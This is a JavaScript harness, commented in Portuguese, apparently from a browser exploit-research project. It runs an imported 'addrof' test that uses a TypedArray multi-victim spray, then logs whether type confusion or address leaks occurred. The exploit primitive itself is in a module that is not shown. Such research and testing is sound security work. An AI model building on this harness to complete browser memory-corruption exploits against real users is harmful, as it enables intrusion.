// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { 
    executeTypedArrayVictimAddrofTest_MultiVictimSpray,   // NOME DA FUNÇÃO ATUALIZADO
    FNAME_MODULE_TYPEDARRAY_ADDROF_V20_MVS    // NOME DO MÓDULO ATUALIZADO
} from './testArrayBufferVictimCrash.mjs';

async function runHeisenbugReproStrategy_TypedArrayVictim() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_MultiVictimSpray";
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug com TypedArray Vítima (MultiVictimSpray) ====`, 'test', FNAME_RUNNER);

    const result = await executeTypedArrayVictimAddrofTest_MultiVictimSpray(); 

    if (result.errorOccurred) {
        logS3(`   RESULTADO: ERRO JS CAPTURADO: ${result.errorOccurred.name} - ${result.errorOccurred.message}.`, "error", FNAME_RUNNER);
        document.title = `Heisenbug (TypedArray-MVS) ERR: ${result.errorOccurred.name}`;
    } else {
        logS3(`   RESULTADO: Completou. Stringify Output Length: ${result.stringifyResultLength}`, "good", FNAME_RUNNER);
        
        if (result.overall_addrof_success) {
            logS3(`     !!!! SUCESSO ADDROF EM UMA OU MAIS VÍTIMAS !!!!`, "vuln", FNAME_RUNNER);
            document.title = `Heisenbug (TypedArray-MVS) Addr SUCCESS!`;
        } else {
            let anyConfused = result.victim_results && result.victim_results.some(v => v.confused);
            if (anyConfused) {
                logS3(`     Type confusion observada em uma ou mais vítimas, mas addrof falhou.`, "warn", FNAME_RUNNER);
                document.title = `Heisenbug (TypedArray-MVS) TC OK, Addr Fail`;
            } else {
                logS3(`     Nenhuma type confusion ou addrof bem-sucedido.`, "info", FNAME_RUNNER);
                document.title = `Heisenbug (TypedArray-MVS) Test OK/No TC`;
            }
        }
        // Log detalhado das vítimas que tiveram confusão ou sucesso
        if (result.victim_results) {
            result.victim_results.forEach(vr => {
                if (vr.confused || vr.addrof_A || vr.addrof_B) {
                    logS3(`     Victim ${vr.id}: Confused=${vr.confused}, AddrA=${vr.addrof_A}, AddrB=${vr.addrof_B}`, "leak", FNAME_RUNNER);
                }
            });
        }
    }
    logS3(`   Título da página: ${document.title}`, "info");
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`==== Estratégia de Reprodução do Heisenbug (MultiVictimSpray) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_MVS}_MainOrchestrator`; 
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== User Agent: ${navigator.userAgent} ====`,'info', FNAME_ORCHESTRATOR);
    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}): Reproduzindo Heisenbug com TypedArray Vítima (MultiVictimSpray) ====`, 'test', FNAME_ORCHESTRATOR);

    await runHeisenbugReproStrategy_TypedArrayVictim();

    logS3(`\n==== Script 3 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    if (runBtn) runBtn.disabled = false;

    if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V20_MVS)) {
        if (!document.title.includes("CRASH") && !document.title.includes("RangeError") && 
            !document.title.includes("SUCCESS") && !document.title.includes("Addr Fail") && 
            !document.title.includes("ERR") && !document.title.includes("TC OK")) { 
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_MVS} Concluído`;
        }
    }
}
